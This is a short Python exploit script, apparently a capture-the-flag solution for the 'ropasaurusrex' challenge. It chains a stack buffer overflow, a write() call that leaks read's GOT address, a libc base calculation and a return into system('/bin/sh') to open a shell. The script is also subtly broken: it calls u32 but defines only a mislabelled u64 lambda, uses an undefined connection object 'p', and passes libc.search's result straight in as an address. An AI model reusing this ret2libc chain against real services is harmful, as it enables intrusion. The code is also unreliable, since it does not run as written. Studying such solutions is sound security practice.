from roppy import *
import struct


u64 = lambda x: struct.unpack("<I", x)[0]
elf = ELF('./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
bof = 0x80483f4 # sub_80483F4()
 

payload = b''
payload += b'A' * 0x88
payload += b'AAAA' # saved ebp
payload += p32(elf.symbols['write']) 
payload += p32(bof)           
payload += p32(1)        #write(1,read,4)
payload += p32(elf.got['read'])
payload += p32(4) 
p.send(payload)
resp = p.recvn(4)
read = u32(resp)
libc_base = read - libc.symbols['read']
  
payload = b''
payload += b'A' * 0x88
payload += b'AAAA' # saved ebp
payload += p32(libc_base + libc.symbols['system'])
payload += b'AAAA' # cont
payload += p32(libc_base + libc.search('/bin/sh'))
p.send(payload)
  
p.interact()